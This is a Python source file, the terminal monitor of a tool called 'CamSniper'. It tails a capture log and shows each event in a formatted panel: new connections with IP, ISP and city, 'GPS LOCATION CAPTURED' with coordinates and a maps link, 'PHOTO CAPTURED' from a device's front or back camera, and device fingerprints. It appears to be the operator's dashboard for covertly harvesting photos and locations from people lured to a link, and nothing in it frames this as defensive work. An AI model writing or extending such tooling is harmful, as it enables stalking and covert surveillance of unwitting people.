#!/usr/bin/env python3
"""
CamSniper - Real-time Terminal Monitor
Watches the capture log and displays events with rich formatting.
"""

import json
import sys
import time
from datetime import datetime
from pathlib import Path

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.text import Text
    from rich import box
    HAS_RICH = True
except ImportError:
    HAS_RICH = False

TOOL_DIR = Path(sys.argv[1]) if len(sys.argv) > 1 else Path(".")
LOG_FILE = TOOL_DIR / "logs" / "captures.jsonl"


def fmt_time(iso: str) -> str:
    try:
        dt = datetime.fromisoformat(iso.rstrip("Z"))
        return dt.strftime("%H:%M:%S")
    except Exception:
        return iso


def display_event_rich(console, event: dict):
    etype = event.get("type", "unknown")
    ts = fmt_time(event.get("timestamp", ""))
    sid = event.get("session_id", "?")[:16]

    if etype == "connection":
        ip = event.get("ip", "?")
        ua = event.get("user_agent", "?")[:60]
        geo = event.get("geo", {})
        country = geo.get("country", "")
        city = geo.get("city", "")
        isp = geo.get("isp", "")
        loc_str = f"{city}, {country}" if city else country

        panel = Panel(
            Text.assemble(
                ("IP:         ", "bold cyan"),   (f"{ip}\n", "white"),
                ("Location:   ", "bold cyan"),   (f"{loc_str}\n", "white"),
                ("ISP:        ", "bold cyan"),   (f"{isp}\n", "white"),
                ("User-Agent: ", "bold cyan"),   (f"{ua}\n", "white"),
                ("Session:    ", "bold cyan"),   (f"{sid}", "dim white"),
            ),
            title=f"[bold green]🔗 NEW CONNECTION [{ts}][/bold green]",
            border_style="green",
            padding=(0, 1),
        )
        console.print(panel)

    elif etype == "location":
        lat = event.get("latitude", "?")
        lon = event.get("longitude", "?")
        acc = event.get("accuracy", "?")
        maps = event.get("maps_url", "")

        panel = Panel(
            Text.assemble(
                ("Latitude:   ", "bold yellow"),  (f"{lat}\n", "white"),
                ("Longitude:  ", "bold yellow"),  (f"{lon}\n", "white"),
                ("Accuracy:   ", "bold yellow"),  (f"{acc} meters\n", "white"),
                ("Maps:       ", "bold yellow"),  (f"{maps}", "underline blue"),
            ),
            title=f"[bold yellow]📍 GPS LOCATION CAPTURED [{ts}][/bold yellow]",
            border_style="yellow",
            padding=(0, 1),
        )
        console.print(panel)

    elif etype == "photo":
        idx = event.get("photo_index", 0)
        cam = event.get("camera_facing", "front")
        fn = event.get("filename", "?")
        path = event.get("photo_path", "?")

        panel = Panel(
            Text.assemble(
                ("Camera:     ", "bold magenta"),  (f"{cam}\n", "white"),
                ("Index:      ", "bold magenta"),  (f"#{idx}\n", "white"),
                ("Filename:   ", "bold magenta"),  (f"{fn}\n", "white"),
                ("Saved to:   ", "bold magenta"),  (f"{path}", "dim white"),
            ),
            title=f"[bold magenta]📷 PHOTO CAPTURED [{ts}][/bold magenta]",
            border_style="magenta",
            padding=(0, 1),
        )
        console.print(panel)

    elif etype == "device_info":
        ip = event.get("ip", "?")
        fp = event.get("fingerprint", {})
        panel = Panel(
            Text.assemble(
                ("IP:         ", "bold blue"),  (f"{ip}\n", "white"),
                ("Platform:   ", "bold blue"),  (f"{fp.get('platform','?')}\n", "white"),
                ("Languages:  ", "bold blue"),  (f"{fp.get('languages','?')}\n", "white"),
                ("Timezone:   ", "bold blue"),  (f"{fp.get('timezone','?')}", "white"),
            ),
            title=f"[bold blue]🖥️  DEVICE INFO [{ts}][/bold blue]",
            border_style="blue",
            padding=(0, 1),
        )
        console.print(panel)


def display_event_plain(event: dict):
    etype = event.get("type", "unknown")
    ts = fmt_time(event.get("timestamp", ""))
    ip = event.get("ip", "?")

    if etype == "connection":
        print(f"[{ts}] NEW CONNECTION | IP: {ip} | UA: {event.get('user_agent','?')[:50]}")
    elif etype == "location":
        print(f"[{ts}] GPS CAPTURED   | Lat: {event.get('latitude')} Lon: {event.get('longitude')} | {event.get('maps_url','')}")
    elif etype == "photo":
        print(f"[{ts}] PHOTO SAVED    | {event.get('filename','?')} | Camera: {event.get('camera_facing','?')}")
    elif etype == "device_info":
        print(f"[{ts}] DEVICE INFO    | IP: {ip}")


def main():
    if HAS_RICH:
        console = Console()
        console.print(Panel("[bold cyan]CamSniper Monitor - Watching for captures...[/bold cyan]", border_style="cyan"))
    else:
        print("[*] CamSniper Monitor - Watching for captures...")

    seen_lines = 0
    # First, replay existing log
    if LOG_FILE.exists():
        lines = LOG_FILE.read_text().splitlines()
        for line in lines:
            line = line.strip()
            if line:
                try:
                    ev = json.loads(line)
                    if HAS_RICH:
                        display_event_rich(console, ev)
                    else:
                        display_event_plain(ev)
                except Exception:
                    pass
        seen_lines = len(lines)

    # Then tail new events
    while True:
        time.sleep(1)
        if not LOG_FILE.exists():
            continue
        lines = LOG_FILE.read_text().splitlines()
        if len(lines) > seen_lines:
            new_lines = lines[seen_lines:]
            for line in new_lines:
                line = line.strip()
                if line:
                    try:
                        ev = json.loads(line)
                        if HAS_RICH:
                            display_event_rich(console, ev)
                        else:
                            display_event_plain(ev)
                    except Exception:
                        pass
            seen_lines = len(lines)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[*] Monitor stopped.")
